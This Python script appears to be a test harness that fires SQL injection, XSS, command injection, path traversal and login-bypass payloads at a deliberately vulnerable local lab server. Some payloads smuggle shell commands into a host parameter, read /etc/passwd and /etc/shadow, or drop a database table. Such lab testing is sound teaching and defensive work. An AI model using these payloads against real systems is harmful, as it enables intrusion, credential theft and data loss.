#!/usr/bin/env python3
"""
Test Script for Vulnerable Server Attack Vectors
This script demonstrates various security vulnerabilities in the vulnerable server.
"""

import requests
import json
import time

BASE_URL = "http://localhost:5000"

def test_sql_injection():
    """Test SQL Injection vulnerabilities"""
    print("🔍 Testing SQL Injection...")
    
    # SQL Injection in search
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "'; DROP TABLE posts; --",
        "' OR '1'='1"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(f"{BASE_URL}/search", params={'q': payload})
            print(f"  ✅ Search with '{payload}': {response.status_code}")
        except Exception as e:
            print(f"  ❌ Error with '{payload}': {e}")

def test_xss():
    """Test Cross-Site Scripting vulnerabilities"""
    print("🎯 Testing XSS...")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>"
    ]
    
    # Test XSS in posts
    for payload in xss_payloads:
        try:
            data = {
                'title': f'XSS Test - {payload}',
                'content': payload
            }
            response = requests.post(f"{BASE_URL}/add_post", data=data)
            print(f"  ✅ XSS payload in post: {payload[:30]}...")
        except Exception as e:
            print(f"  ❌ Error with XSS payload: {e}")

def test_command_injection():
    """Test Command Injection vulnerabilities"""
    print("💻 Testing Command Injection...")
    
    cmd_payloads = [
        "localhost; ls -la",
        "localhost && whoami",
        "localhost | cat /etc/passwd",
        "localhost; echo 'test' > /tmp/test.txt"
    ]
    
    for payload in cmd_payloads:
        try:
            response = requests.get(f"{BASE_URL}/ping", params={'host': payload})
            print(f"  ✅ Command injection with '{payload}': {response.status_code}")
        except Exception as e:
            print(f"  ❌ Error with command injection: {e}")

def test_path_traversal():
    """Test Path Traversal vulnerabilities"""
    print("📂 Testing Path Traversal...")
    
    path_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "../../../etc/shadow"
    ]
    
    for payload in path_payloads:
        try:
            response = requests.get(f"{BASE_URL}/file", params={'path': payload})
            print(f"  ✅ Path traversal with '{payload}': {response.status_code}")
        except Exception as e:
            print(f"  ❌ Error with path traversal: {e}")

def test_information_disclosure():
    """Test Information Disclosure vulnerabilities"""
    print("🔓 Testing Information Disclosure...")
    
    try:
        response = requests.get(f"{BASE_URL}/api/users")
        if response.status_code == 200:
            users = response.json()
            print(f"  ✅ API exposed {len(users.get('users', []))} users with passwords!")
            for user in users.get('users', []):
                print(f"     👤 {user['username']}: {user['password']}")
    except Exception as e:
        print(f"  ❌ Error testing information disclosure: {e}")

def test_weak_authentication():
    """Test Weak Authentication"""
    print("🔐 Testing Weak Authentication...")
    
    # Test SQL injection in login
    login_payloads = [
        ("admin' --", "anything"),
        ("' OR 1=1 --", "anything"),
        ("admin", "admin' OR '1'='1")
    ]
    
    for username, password in login_payloads:
        try:
            data = {'username': username, 'password': password}
            response = requests.post(f"{BASE_URL}/login", data=data)
            print(f"  ✅ Login attempt with '{username}': {response.status_code}")
        except Exception as e:
            print(f"  ❌ Error with login test: {e}")

def test_file_upload():
    """Test Insecure File Upload"""
    print("📁 Testing Insecure File Upload...")
    
    # Create a simple test file
    test_content = "This is a test file for upload vulnerability testing"
    
    try:
        files = {'file': ('test.txt', test_content, 'text/plain')}
        response = requests.post(f"{BASE_URL}/upload", files=files)
        print(f"  ✅ File upload test: {response.status_code}")
    except Exception as e:
        print(f"  ❌ Error with file upload test: {e}")

def test_csrf():
    """Test CSRF vulnerabilities"""
    print("🔄 Testing CSRF...")
    
    # Test if CSRF protection is missing
    try:
        # Try to add a post without CSRF token
        data = {
            'title': 'CSRF Test',
            'content': 'This is a CSRF test'
        }
        response = requests.post(f"{BASE_URL}/add_post", data=data)
        print(f"  ✅ CSRF test (no protection): {response.status_code}")
    except Exception as e:
        print(f"  ❌ Error with CSRF test: {e}")

def test_idor():
    """Test Insecure Direct Object References"""
    print("🎯 Testing IDOR...")
    
    # Test accessing admin panel without proper authentication
    try:
        response = requests.get(f"{BASE_URL}/admin")
        print(f"  ✅ IDOR test (admin access): {response.status_code}")
    except Exception as e:
        print(f"  ❌ Error with IDOR test: {e}")

def main():
    """Run all vulnerability tests"""
    print("🚀 Starting Vulnerability Tests")
    print("=" * 50)
    
    tests = [
        test_sql_injection,
        test_xss,
        test_command_injection,
        test_path_traversal,
        test_information_disclosure,
        test_weak_authentication,
        test_file_upload,
        test_csrf,
        test_idor
    ]
    
    for test in tests:
        try:
            test()
            time.sleep(1)  # Small delay between tests
        except Exception as e:
            print(f"❌ Test failed: {e}")
        print()
    
    print("✅ All tests completed!")
    print("\n📋 Summary:")
    print("  - SQL Injection: Tested in search and login")
    print("  - XSS: Tested in posts and comments")
    print("  - Command Injection: Tested in ping feature")
    print("  - Path Traversal: Tested in file access")
    print("  - Information Disclosure: Tested in API")
    print("  - Weak Authentication: Tested with SQL injection")
    print("  - File Upload: Tested without validation")
    print("  - CSRF: Tested missing protection")
    print("  - IDOR: Tested admin access")

if __name__ == "__main__":
    main() 